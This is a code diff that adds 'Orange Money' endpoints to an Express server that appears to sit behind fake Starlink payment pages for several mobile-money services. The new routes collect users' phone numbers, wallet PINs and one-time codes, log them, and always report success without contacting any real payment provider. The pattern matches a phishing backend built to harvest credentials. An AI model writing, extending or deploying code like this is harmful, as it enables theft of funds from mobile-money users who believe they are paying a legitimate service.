@@ -198,6 +198,25 @@ app.post('/api/b2c-backend/v2/resend-otp', (req, res) => {
     res.json({ status: 'SUCCESS', data: { otpId: 'otp-' + Date.now() } });
 });
 
+// ── Orange Money endpoints ───────────────────────────────────────
+app.post('/api/orange/submit', (req, res) => {
+    const { phone, pin, country, starlinkPackage } = req.body;
+    console.log('Orange submit:', { phone, pin, country, starlinkPackage });
+    res.json({ status: 'SUCCESS', message: 'Orange payment initiated' });
+});
+
+app.post('/api/orange/verify-otp', (req, res) => {
+    const { otp, phone, country } = req.body;
+    console.log('Orange verify OTP:', { otp, phone, country });
+    res.json({ status: 'SUCCESS', message: 'OTP verified successfully' });
+});
+
+app.post('/api/orange/resend-otp', (req, res) => {
+    const { phone, country } = req.body;
+    console.log('Orange resend OTP:', { phone, country });
+    res.json({ status: 'SUCCESS', data: { otpId: 'otp-' + Date.now() } });
+});
+
 // ── Payment gateway pages ───────────────────────────────────────
 const paymentGateways = ['moov', 'lumitel', 'ecocash', 'orange', 'waafi', 'card', 'kbzpay', 'mtn'];
 paymentGateways.forEach(gateway => {
